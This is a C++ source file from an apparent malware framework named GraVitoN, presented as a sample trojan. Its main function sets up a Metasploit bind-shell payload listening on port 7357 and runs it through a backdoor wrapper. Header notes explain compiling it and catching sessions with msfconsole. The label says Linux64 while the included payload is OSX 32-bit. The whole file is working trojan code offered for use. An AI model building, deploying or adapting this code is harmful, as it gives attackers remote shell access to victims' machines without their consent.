/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 * 
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief GraVitoN - Sample Linux64 Trojan
 * 
 * @section Note
 * 1. Disable g++ optimization (make <...> CPPFLAGS=-O0 |or| g++ <..> -O0) \n
 * 2. If you are using msfconsole/exploit/multi/handler, push Ctrl+Z in case of sending a session to background. \n
 */


/// Activate/Deactivate GraVitoN logger
// #define GVN_ACTIVATE_LOGGER
/// Print logs into a file
//#define GVN_LOG_INTO_FILE
/// Path to Log File
//#define GVN_LOG_FILE "./graviton_logs.txt"

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#include <graviton.hpp>
#include <payload/osx/msf_shell_bind_32.hpp>
// #include <payload/osx/dos_32.hpp>
#include <ai/backdoor_sample.hpp>
#include <iostream>
using namespace std;

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
int main()
{
    GraVitoN::Core::Logger::logItLn ( "main -> Started" );

    GraVitoN::Payload::OSX_MSF_Shell_Bind_32 msfpay;
    msfpay.initialize(7357);
    // GraVitoN::Payload::OSX_DoS_32 msfpay;
    // msfpay.initialize();

    GraVitoN::AI::Backdoor_Sample backy(msfpay);

    backy.run();

    GraVitoN::Core::Logger::logItLn ( "main -> done" );

    return 0;
}
